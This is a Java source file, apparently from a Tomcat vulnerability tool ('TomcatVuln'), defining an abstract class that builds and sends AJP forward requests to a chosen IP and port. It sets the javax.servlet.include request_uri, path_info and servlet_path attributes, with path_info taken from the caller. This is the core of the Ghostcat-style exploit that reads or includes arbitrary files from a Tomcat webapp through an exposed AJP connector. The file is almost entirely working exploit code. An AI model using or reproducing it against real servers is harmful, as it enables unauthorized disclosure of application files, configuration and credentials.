package org.dudu.TomcatVuln.request;

import com.github.jrialland.ajpclient.*;
import org.dudu.TomcatVuln.DTO.AjpRequestDTO;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

/**
 * @description: AJP请求
 * @author：DUDU
 * @date: 2023/10/9
 **/
public abstract  class AjpRequest {

    protected  SimpleForwardResponse request_response(AjpRequestDTO request) throws Exception {
        SimpleForwardRequest ajpRequest = new SimpleForwardRequest();
        ajpRequest.setRequestUri(request.getUri());
        List<Attribute> attributes = new ArrayList<>(3);
        attributes.add(new Attribute(AttributeType.REQ_ATTRIBUTE, Arrays.asList(new String[]{"javax.servlet.include.request_uri","/"})));
        attributes.add(new Attribute(AttributeType.REQ_ATTRIBUTE, Arrays.asList(new String[]{"javax.servlet.include.path_info",request.getPath()})));
        attributes.add(new Attribute(AttributeType.REQ_ATTRIBUTE, Arrays.asList(new String[]{"javax.servlet.include.servlet_path","/"})));
        ajpRequest.setAttributes(attributes);
        SimpleForwardResponse ajpResponse = new SimpleForwardResponse();
        new Forward(ajpRequest,ajpResponse).execute(request.getIp(), Integer.parseInt(request.getPort()));
        return ajpResponse;
    }
    protected  SimpleForwardResponse request_response(String uri,String path,String ip,String port) throws Exception {
        SimpleForwardRequest ajpRequest = new SimpleForwardRequest();
        ajpRequest.setRequestUri(uri);
        List<Attribute> attributes = new ArrayList<>(3);
        attributes.add(new Attribute(AttributeType.REQ_ATTRIBUTE, Arrays.asList(new String[]{"javax.servlet.include.request_uri","/"})));
        attributes.add(new Attribute(AttributeType.REQ_ATTRIBUTE, Arrays.asList(new String[]{"javax.servlet.include.path_info",path})));
        attributes.add(new Attribute(AttributeType.REQ_ATTRIBUTE, Arrays.asList(new String[]{"javax.servlet.include.servlet_path","/"})));
        ajpRequest.setAttributes(attributes);
        SimpleForwardResponse ajpResponse = new SimpleForwardResponse();
        new Forward(ajpRequest,ajpResponse).execute(ip, Integer.parseInt(port));
        return ajpResponse;
    }
    protected String request_string(AjpRequestDTO request) throws Exception {
       return  request_response(request).getResponseBodyAsString();
    }


}
